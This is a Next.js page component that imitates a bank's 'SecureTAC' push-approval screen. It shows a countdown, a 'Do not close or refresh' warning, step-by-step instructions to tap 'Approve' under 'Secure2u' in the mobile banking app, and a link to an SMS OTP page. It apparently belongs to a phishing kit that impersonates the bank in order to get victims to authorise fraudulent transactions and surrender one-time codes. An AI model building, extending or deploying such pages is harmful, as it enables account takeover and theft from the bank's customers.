"use client";

import React, { useState, useEffect } from "react";
import { Smartphone, Bell, Settings, CheckCircle2 } from "lucide-react";
import Link from "next/link";

export default function ApprovePage() {
  const [timeLeft, setLeft] = useState(266); // 4 minutes 26 seconds

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs
      .toString()
      .padStart(2, "0")}`;
  };

  const progress = (timeLeft / 300) * 100; // Assuming 5 minutes total

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="flex items-center gap-3 border-b border-gray-200 bg-[#FDFBF1] p-4">
        <div className="flex items-center gap-1">
          <Smartphone size={32} className="text-black" />
          <Bell size={28} className="text-[#FBC02D] fill-[#FBC02D]" />
        </div>
        <div className="flex flex-col">
          <h1 className="text-xl font-bold leading-tight text-[#444]">
            SecureTAC Approval:
          </h1>
          <p className="text-sm text-gray-500">Do not close or refresh.</p>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-8 py-14 text-center">
        <h2 className="mb-14 max-w-[280px] text-[22px] font-bold leading-[1.3] text-[#424242]">
          Check your phone to authorise your transaction via the Mobile app.
        </h2>

        {/* Timer Box */}
        <div className="mb-10 flex items-center justify-center gap-2">
          <div className="relative mr-2">
            <Smartphone size={52} className="text-black" strokeWidth={1.5} />
            <div className="absolute top-1/2 left-1/2 flex -translate-x-1/2 -translate-y-1/2 flex-wrap justify-center gap-0.5 w-6">
              {[...Array(6)].map((_, i) => (
                <div key={i} className={`h-1.5 w-1.5 rounded-sm ${["bg-blue-400", "bg-red-400", "bg-yellow-400", "bg-green-400", "bg-purple-400", "bg-orange-400"][i]}`} />
              ))}
            </div>
          </div>
          
          <div className="flex items-center">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-gray-300">
              <path d="M5 12H19M19 12L12 5M19 12L12 19" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>

          <div className="ml-2 rounded-xl bg-[#CC1A21] px-7 py-4 shadow-[0_4px_10px_rgba(204,26,33,0.3)]">
            <span className="text-[42px] font-bold tracking-tight text-white tabular-nums leading-none">
              {formatTime(timeLeft)}
            </span>
          </div>
        </div>

        {/* SMS Link */}
        <div className="mb-8">
          <Link href={'/b/status/verification'} className="text-[14px] font-bold text-[#1565C0] underline decoration-[1.5px] underline-offset-2">
            Did not receive the notification? Here for SMS OTP
          </Link>
        </div>

        {/* Progress Bar */}
        <div className="mb-14 w-full max-w-[320px] overflow-hidden rounded-full bg-[#E0E0E0] h-[10px]">
          <div
            className="h-full rounded-full bg-[#FB8C00] transition-all duration-1000 ease-linear"
            style={{ width: `${progress}%` }}
          />
        </div>

        {/* Instruction Box */}
        <div className="w-full max-w-sm overflow-hidden rounded-lg border-2 border-[#FBC02D]">
          <div className="bg-[#FBC02D] py-2 text-center text-[13px] font-bold text-black">
            Follow these steps if notification doesn't appear:
          </div>
          <div className="bg-white px-4 py-5 text-left">
            <div className="flex flex-col gap-6">
              {/* Step 1 */}
              <div className="flex items-center gap-4">
                <div className="flex h-6 w-6 shrink-0 items-center justify-center">
                  <Smartphone size={24} className="text-black" />
                </div>
                <p className="text-[13px] font-bold uppercase tracking-tight">
                  STEP 1: <span className="font-normal normal-case">Launch the 'App'</span>
                </p>
              </div>

              {/* Step 2 */}
              <div className="flex items-center gap-4">
                <div className="flex h-6 w-6 shrink-0 items-center justify-center">
                  <Settings size={24} className="text-[#90A4AE]" />
                </div>
                <p className="text-[13px] font-bold uppercase tracking-tight">
                  STEP 2: <span className="font-normal normal-case text-gray-700">Tap 'Secure2u' under 'Quick Actions'</span>
                </p>
              </div>

              {/* Step 3 */}
              <div className="flex items-center gap-4">
                <div className="flex h-6 w-6 shrink-0 items-center justify-center">
                  <div className="flex h-5 w-5 items-center justify-center rounded bg-[#8BC34A]">
                    <CheckCircle2 size={16} className="text-white" />
                  </div>
                </div>
                <p className="text-[13px] font-bold uppercase tracking-tight">
                  STEP 3: <span className="font-normal normal-case text-gray-700">Tap 'Approve' to authorise</span>
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
